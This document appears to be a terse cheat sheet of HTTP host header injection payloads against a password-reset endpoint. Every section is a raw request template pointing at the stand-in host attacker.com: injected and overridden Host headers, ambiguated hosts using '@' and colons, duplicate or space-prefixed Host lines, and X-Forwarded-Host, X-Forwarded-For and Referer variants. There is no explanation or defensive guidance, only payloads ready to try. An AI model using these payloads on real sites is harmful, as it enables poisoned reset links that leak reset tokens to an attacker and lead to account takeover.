##### HOST HEADER INJECTION
````
POST /reset
HOST: attacker.com
````

##### OVERRIDE HOST HEADER
````
POST https://target.com/reset
HOST: attacker.com
````

##### AMBIGUATE HOST HEADER
````
POST /reset
HOST: target.com@attacker.com


HOST: target.com:@attacker.com
HOST: target.com: attacker.com
````
##### other techniques
````
POST @attacker.com/reset
HOST: target.com


POST /reset@attacker.com#
HOST: target.com
````
##### DOUBLE HOST
````
POST /reset
HOST: target.com
HOST: attacker.com


add space in the host
POST /reset
HOST: target.com
 HOST: attacker.com

````
##### X-FORWARDED-FOR
````
POST /reset
HOST: attacker.com
X-FORWARDED-HOST: attacker.com



POST /reset
HOST: attacker.com
X-FORWARDED-HOST: target.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
Referer: https://attacker.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
X-FORWARDED-FOR: attacker.com
````
